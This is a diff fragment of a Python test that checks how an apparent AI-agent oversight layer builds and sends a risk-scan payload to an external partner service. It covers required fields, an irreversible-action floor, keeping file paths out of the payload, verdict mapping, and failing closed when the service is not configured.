+    _env = build_envelope("write_file", {"path": r"E:\ML_PROJECTS\AGENT_ZERO\drill_workspace\note.txt",
+                                         "content": "x", "mode": "rewrite"})
+    _env["irreversible"] = True
+    _env["risk_class"] = "medium"
+    scan = build_partner_c_scan(_env, session_id="sess-1")
+
+    # (a) every field the live API declares mandatory — this exact list came from its own 422 body.
+    for k in ("agent_id", "session_id", "action_type", "requested_consequence", "authority_ref",
+              "mandate_ref", "scope_ref", "temporal_context", "risk_context", "payload_hash"):
+        if k not in scan:
+            fails.append(f"scan payload: missing required field {k}")
+    if scan.get("session_id") != "sess-1":
+        fails.append("scan: explicit session_id not honoured")
+
+    # (b) mandate_ref must be PRESENT-and-null (unanchored), never absent — absent is a schema error,
+    #     null is a truthful statement that no delegation anchors this action.
+    if "mandate_ref" not in scan or scan["mandate_ref"] is not None:
+        fails.append("scan: mandate_ref must be present and null (unanchored delegation)")
+
+    # (c) the two probe-established shapes. Regressing either silently BLOCKS every action:
+    #     wrong temporal keys -> TEMPORAL_NO_RECOGNIZED_FIELD; missing top-level risk fields -> the
+    #     ceiling block returns all-null.
+    tc = scan.get("temporal_context") or {}
+    if "requested_at" not in tc:
+        fails.append(f"scan: temporal_context must carry requested_at, got {sorted(tc)}")
+    # Partner confirmed 2026-08-12 that ttl_seconds is NOT a recognized field — an earlier build sent it
+    # and "worked", but on requested_at alone. Pin its ABSENCE so the cargo cult cannot creep back.
+    if "ttl_seconds" in tc:
+        fails.append("scan: ttl_seconds is not a recognized partner field — must not be sent")
+    for k in ("risk_class", "irreversible", "pre_floor_tier", "resolved_consequence_ceiling"):
+        if k not in scan:
+            fails.append(f"scan: {k} must be TOP-LEVEL (canonical location, partner-confirmed)")
+    # resolved_consequence_ceiling is what they echo back as clara_resolved_ceiling and compare against
+    # their own — send the RESOLVED value (post-floor), not the pre-floor tier, or the comparison is
+    # meaningless whenever the irreversible floor bites.
+    if scan.get("resolved_consequence_ceiling") != T_IRR:
+        fails.append("scan: resolved_consequence_ceiling must be the POST-floor value")
+
+    # (d) the irreversible floor still has to bite.
+    if scan.get("pre_floor_tier") != T_REV:
+        fails.append(f"scan: pre_floor_tier {scan.get('pre_floor_tier')!r} != {T_REV!r}")
+    if scan.get("requested_consequence") != T_IRR:
+        fails.append("scan: resolved ceiling did not apply the irreversible floor")
+    if "::" not in str(scan.get("scope_ref", "")):
+        fails.append(f"scan: scope_ref {scan.get('scope_ref')!r} not in '{{type}}::{{hash}}' form")
+
+    # (e) PRIVACY FLOOR — unchanged and non-negotiable.
+    _blob = json.dumps(scan)
+    for leak in ("ML_PROJECTS", "note.txt", "drill_workspace", "E:\\\\"):
+        if leak in _blob:
+            fails.append(f"scan PRIVACY FLOOR BREACH: raw target detail {leak!r} present in payload")
+
+    # (f) verdict mapping, both vocabularies. CONTESTED has no external equivalent, so the external
+    #     fallback must not flatten it to ALLOW.
+    if _PARTNER_C_VERDICT.get("CONTESTED") != REVIEW:
+        fails.append("scan: CONTESTED must map to REVIEW")
+    if _PARTNER_C_EXTERNAL.get("REVIEW") != "CONTESTED":
+        fails.append("scan: external REVIEW must map back to CONTESTED, not CLEAR")
+
+    # Dormant until configured: no key/url must RAISE, never silently ALLOW.
+    for _k in ("PARTNER_C_API_KEY", "PARTNER_C_URL"):
+        os.environ.pop(_k, None)
+    try:
+        _partner_c_evaluate(_env, {})
+        fails.append("partner_c: evaluated without configuration instead of raising")
+    except RuntimeError:
+        pass
+    if "partner_c" not in _ADAPTERS or "partner_c" not in _REMOTE_ADAPTERS:
+        fails.append("partner_c: not registered as a remote adapter")
 
     shutil.rmtree(tmpdir, ignore_errors=True)
     for k, v in _saved.items():
